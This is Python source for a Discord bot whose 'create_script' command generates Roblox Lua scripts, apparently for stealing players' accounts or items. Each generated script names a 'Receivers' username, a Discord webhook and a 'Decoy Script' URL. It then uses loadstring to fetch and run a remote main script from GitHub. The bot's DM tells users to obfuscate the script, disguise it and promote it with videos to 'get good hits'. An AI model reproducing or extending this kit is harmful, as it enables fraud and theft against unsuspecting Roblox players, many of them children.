import os
import discord
from discord.ext import commands
from discord import app_commands
from dotenv import load_dotenv

load_dotenv()  # Loads BOT_TOKEN from .env or Render Env

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

@tree.command(name="create_script", description="Generate a Roblox script config and get it as DM")
@app_commands.describe(
    username="Your Roblox username (not display name ⚠️)",
    github_url="GitHub raw HTTPS link for Decoy Script (no loadstring added ⚠️)",
    webhook_url="Your Discord webhook URL"
)
async def create_script(interaction: discord.Interaction, username: str, github_url: str, webhook_url: str):
    if not github_url.startswith("https://raw.githubusercontent.com/"):
        await interaction.response.send_message("❌ GitHub raw URL must start with `https://raw.githubusercontent.com/`", ephemeral=True)
        return

    if not webhook_url.startswith("https://discord.com/api/webhooks/"):
        await interaction.response.send_message("❌ Invalid Discord webhook URL.", ephemeral=True)
        return

    lua_script = f'''
Config = {{
  Receivers = {{"{username}"}},
  Webhook = "{webhook_url}",
  ScriptURL = "{github_url}",
}}

loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BOT-SCRIPT/refs/heads/main/Main%20Script"))()
'''.strip()

    try:
        dm = await interaction.user.create_dm()
        await dm.send("✅ Here's your clean script: First, obfuscate the code and upload it to a new GitHub repository. Once saved, copy the raw script link (HTTPS), insert it into a loadstring and you will be done. Make sure to upload vids, ect to get good hits (Good luck ✊🏾) :\n```lua\n" + lua_script + "\n```")

        file = discord.File(fp=bytes(lua_script, 'utf-8'), filename="generated_script.lua")
        await dm.send("💾 PC Users: Download the `.lua` file below.", file=file)

        await interaction.response.send_message("📬 I've sent your script in DM as text and file.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("❌ I couldn't DM you. Please check your privacy settings.", ephemeral=True)

@bot.event
async def on_ready():
    await tree.sync()
    print(f"✅ Bot is ready as {bot.user}!")

bot.run(os.getenv("BOT_TOKEN"))
